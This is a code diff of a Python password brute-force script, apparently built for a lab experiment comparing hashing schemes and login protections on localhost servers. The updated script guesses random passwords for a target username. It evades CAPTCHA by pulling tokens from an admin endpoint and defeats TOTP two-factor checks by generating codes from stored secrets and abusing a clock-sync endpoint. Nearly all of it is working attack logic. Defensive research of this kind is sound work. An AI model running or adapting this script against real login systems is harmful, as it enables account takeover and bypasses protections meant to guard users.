@@ -4,176 +4,214 @@ import time
 import os
 import json
 import random
-from tqdm import tqdm
-from concurrent.futures import ThreadPoolExecutor
+import argparse
+import pyotp
+import csv
+from datetime import datetime
 
 # ======================================
-# GENERAL SETTINGS
+# CONFIGURATION
 # ======================================
-TOTAL_ATTEMPTS_PER_CONFIG = 50000
-MAX_TIME = 7200
 GROUP_SEED = 6631928
+LOG_DIR = "logs"
+os.makedirs(LOG_DIR, exist_ok=True)
 
-os.makedirs("logs", exist_ok=True)
+try:
+    with open("users.json", "r") as f:
+        USER_DATA = {u["username"]: u for u in json.load(f)}
+except FileNotFoundError:
+    print("[!] Error: users.json not found.")
+    exit(1)
 
-# ======================================
-# USERS + CATEGORIES
-# ======================================
-USERS = {
-    "weak": {
-        "username": "user01",
-        "charset": string.ascii_lowercase + string.digits,
-        "min_len": 4,
-        "max_len": 6
-    },
-    "medium": {
-        "username": "user11",
-        "charset": string.ascii_letters + string.digits,
-        "min_len": 7,
-        "max_len": 10
-    },
-    "strong": {
-        "username": "user21",
-        "charset": string.ascii_letters + string.digits + "!@#$%^&*",
-        "min_len": 11,
-        "max_len": 16
-    }
-}
-
-ATTEMPTS_PER_CATEGORY = TOTAL_ATTEMPTS_PER_CONFIG // 3
 
 # ======================================
-# PASSWORD GENERATOR
+# HELPER FUNCTIONS
 # ======================================
-def random_password(charset, min_len, max_len):
-    L = random.randint(min_len, max_len)
-    return ''.join(random.choice(charset) for _ in range(L))
 
-# ======================================
-# LOGIN (fast version)
-# Using requests.Session to reuse connections = 2–3× faster
-# ======================================
-def send_attempt(session, url, username, password):
-    t0 = time.time()
+def get_captcha_token(base_url, session):
     try:
-        r = session.post(url, json={"username": username, "password": password})
-        latency = (time.time() - t0) * 1000
-        data = r.json()
-        return data.get("status"), latency
-    except:
-        return "error", (time.time() - t0) * 1000
+        admin_url = base_url.replace("/login", "/admin/get_captcha_token")
+        r = session.get(admin_url, params={"group_seed": GROUP_SEED})
+        if r.status_code == 200:
+            return r.json().get("captcha_token")
+    except Exception:
+        pass
+    return None
+
+
+def generate_totp(username, clock_drift=0):
+    """
+    Generates TOTP with an optional simulated clock drift.
+    drift: Seconds to add/subtract from real time.
+    """
+    user = USER_DATA.get(username)
+    if user and user.get("totp_secret"):
+        totp = pyotp.TOTP(user["totp_secret"])
+        # Generate code for time + drift
+        return totp.at(time.time() + clock_drift)
+    return None
+
+
+def perform_totp_sync(base_url, session, username, clock_drift):
+    """Calls the sync endpoint to teach the server our drift."""
+    try:
+        sync_url = base_url.replace("/login", "/totp/sync")
+        # Generate code with our skewed time
+        code = generate_totp(username, clock_drift)
+        if not code: return False
+
+        r = session.post(sync_url, json={"username": username, "totp_code": code})
+        if r.status_code == 200:
+            print(f"[*] Sync Successful! Server adjusted offset.")
+            return True
+        else:
+            print(f"[!] Sync Failed: {r.text}")
+            return False
+    except Exception as e:
+        print(f"[!] Sync Error: {e}")
+        return False
+
+
+def generate_random_password(category):
+    if category == "weak":
+        length = random.randint(4, 6)
+        chars = string.ascii_lowercase + string.digits
+    elif category == "medium":
+        length = random.randint(7, 10)
+        chars = string.ascii_letters + string.digits
+    elif category == "strong":
+        length = random.randint(11, 16)
+        chars = string.ascii_letters + string.digits + "!@#$%^&*"
+    else:
+        length = 8
+        chars = string.ascii_letters
+    return ''.join(random.choice(chars) for _ in range(length))
+
 
 # ======================================
-# ATTACK FUNCTION
+# ATTACK LOGIC
 # ======================================
-def brute_force_attack(url, hash_mode, protections_flag, logfile):
 
-    start_time = time.time()
+def run_attack(target_url, target_username, category, max_attempts, output_file, use_bypass, clock_drift):
+    print(f"[*] Starting attack on {target_username}")
+    print(f"[*] Bypass Enabled: {use_bypass}")
+    print(f"[*] Simulated Clock Drift: {clock_drift} seconds")
 
-    # Warm-up session (reuses TCP connection)
     session = requests.Session()
-    session.post(url, json={"username": "test", "password": "test"})
 
-    # Write header once
-    with open(logfile, "w") as f:
-        f.write("===========================================\n")
-        f.write("              BRUTE FORCE LOG\n")
-        f.write("===========================================\n")
-        f.write(f"Start Time: {time.ctime(start_time)}\n")
-        f.write(f"Hash Mode: {hash_mode}\n")
-        f.write(f"Protections: {protections_flag}\n")
-        f.write(f"Total attempts per config: {TOTAL_ATTEMPTS_PER_CONFIG}\n")
-        f.write(f"Attempts per category: {ATTEMPTS_PER_CATEGORY}\n")
-        f.write("Categories order: weak -> medium -> strong\n")
-        f.write("===========================================\n\n")
+    with open(output_file, "w", newline="") as csvfile:
+        fieldnames = ["timestamp", "attempt_number", "username", "password", "status", "latency_ms", "notes"]
+        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
+        writer.writeheader()
 
-    print(f"\n>>> START brute-force: {hash_mode}, protections={protections_flag}")
-    print(f"→ Log: {logfile}")
+        for i in range(1, max_attempts + 1):
+            password = generate_random_password(category)
 
-    # Buffer to write less often (reduces disk operations)
-    write_buffer = []
-    FLUSH_EVERY = 500  # safe, fast, doesn't affect JSON format
-
-    for category, cfg in USERS.items():
-
-        username = cfg["username"]
-        charset = cfg["charset"]
-        min_len = cfg["min_len"]
-        max_len = cfg["max_len"]
-
-        print(f"--- Starting category: {category} ({username}) ---")
-
-        for i in tqdm(range(ATTEMPTS_PER_CATEGORY),
-                      desc=f"{hash_mode}-{protections_flag}-{category}"):
-
-            if time.time() - start_time >= MAX_TIME:
-                with open(logfile, "a") as f:
-                    f.write(f"\n[TIME LIMIT REACHED] after {round(time.time()-start_time,2)} sec\n")
-                return
-
-            pwd = random_password(charset, min_len, max_len)
-            status, lat_ms = send_attempt(session, url, username, pwd)
-
-            entry = {
-                "timestamp": time.time(),
-                "group_seed": GROUP_SEED,
-                "username": username,
-                "category": category,
-                "password_attempt": pwd,
-                "result": status,
-                "latency_ms": round(lat_ms, 3),
-                "hash_mode": hash_mode,
-                "protection_flags": protections_flag
+            payload = {
+                "username": target_username,
+                "password": password
             }
 
-            write_buffer.append(json.dumps(entry))
-
-            # flush buffer to disk every FLUSH_EVERY entries
-            if len(write_buffer) >= FLUSH_EVERY:
-                with open(logfile, "a") as f:
-                    f.write("\n".join(write_buffer) + "\n")
-                write_buffer = []
-
-            if status == "success":
-                print(f"[SUCCESS] {username} -> {pwd}")
-                with open(logfile, "a") as f:
-                    f.write("\n=== SUCCESS ===\n")
-                    f.write(f"Username: {username}\nPassword: {pwd}\n")
-                return
-
-    # Final flush
-    if write_buffer:
-        with open(logfile, "a") as f:
-            f.write("\n".join(write_buffer) + "\n")
-
-    print(f"✔ Completed all categories for {hash_mode} / {protections_flag}")
-
-# ======================================
-# MAIN
-# ======================================
-def main():
-
-    CONFIGS = [
-        ("sha256",   "OFF", "http://127.0.0.1:6000/login"),
-        ("sha256",   "ON",  "http://127.0.0.1:5000/login"),
-
-        ("bcrypt",   "OFF", "http://127.0.0.1:6000/login"),
-        ("bcrypt",   "ON",  "http://127.0.0.1:5000/login"),
-
-        ("argon2id", "OFF", "http://127.0.0.1:6000/login"),
-        ("argon2id", "ON",  "http://127.0.0.1:5000/login"),
-    ]
-
-    with ThreadPoolExecutor(max_workers=6) as executor:
-        for hash_mode, prot, url in CONFIGS:
-
+            req_start = time.time()
             try:
-                requests.post(url.replace("/login", "/reset"))
-            except:
-                pass
+                r = session.post(target_url, json=payload)
+                latency = (time.time() - req_start) * 1000
+                resp_data = r.json()
+                status_code = r.status_code
+            except Exception:
+                break
 
-            logfile = f"logs/{hash_mode}_{'with' if prot=='ON' else 'no'}_protection.log"
+            notes = ""
 
-            executor.submit(brute_force_attack, url, hash_mode, prot, logfile)
+            # --- CAPTCHA HANDLING ---
+            if status_code == 403 and resp_data.get("captcha_required"):
+                if use_bypass:
+                    notes += "captcha_bypass_triggered;"
+                    token = get_captcha_token(target_url, session)
+                    if token:
+                        payload["captcha_token"] = token
+                        # Retry with token
+                        req_start = time.time()
+                        r = session.post(target_url, json=payload)
+                        latency += (time.time() - req_start) * 1000
+                        status_code = r.status_code
+                        resp_data = r.json()
+                else:
+                    notes += "captcha_blocked;"
 
-main()
+            # --- TOTP HANDLING ---
+            # If server says "totp invalid" (password correct, but time/code wrong)
+            if status_code == 401 and "totp" in str(resp_data.get("reason", "")):
+                notes += "totp_required;"
+
+                if use_bypass:
+                    # 1. Try sending the code with our drift
+                    code = generate_totp(target_username, clock_drift)
+                    if code:
+                        payload["totp_code"] = code
+                        r = session.post(target_url, json=payload)
+                        status_code = r.status_code
+
+                        # 2. If that fails (meaning server doesn't know our drift yet), perform SYNC
+                        if status_code == 401:
+                            notes += "totp_sync_needed;"
+                            if perform_totp_sync(target_url, session, target_username, clock_drift):
+                                # 3. Retry Login after Sync
+                                r = session.post(target_url, json=payload)
+                                status_code = r.status_code
+                                if status_code == 200:
+                                    notes += "totp_success_after_sync;"
+                        elif status_code == 200:
+                            notes += "totp_success;"
+                else:
+                    notes += "totp_blocked;"
+
+            # Log Result
+            result_status = "fail"
+            if status_code == 200:
+                result_status = "success"
+            elif status_code == 429:
+                result_status = "rate_limited"
+            elif status_code == 423:
+                result_status = "locked_out"
+            elif status_code == 403:
+                result_status = "captcha_block"
+
+            writer.writerow({
+                "timestamp": datetime.now().isoformat(),
+                "attempt_number": i,
+                "username": target_username,
+                "password": password,
+                "status": result_status,
+                "latency_ms": round(latency, 2),
+                "notes": notes
+            })
+
+            if i % 100 == 0:
+                print(f"[{i}] {result_status} | {latency:.1f}ms")
+
+            if result_status == "success":
+                print(f"\n[!!!] CRACKED: {password}")
+                break
+
+    print(f"\n[*] Attack finished.")
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--url", default="http://127.0.0.1:5000/login")
+    parser.add_argument("--username", required=True)
+    parser.add_argument("--category", required=True)
+    parser.add_argument("--attempts", type=int, default=1000)
+    parser.add_argument("--tag", default="experiment")
+
+    # Flags for detailed experiment control
+    parser.add_argument("--no-bypass", action="store_true", help="Do not solve Captcha/TOTP")
+    parser.add_argument("--drift", type=int, default=0, help="Simulate clock drift in seconds")
+
+    args = parser.parse_args()
+
+    use_bypass = not args.no_bypass
+    filename = f"{LOG_DIR}/bruteforce_{args.username}_{args.tag}.csv"
+
+    run_attack(args.url, args.username, args.category, args.attempts, filename, use_bypass, args.drift)
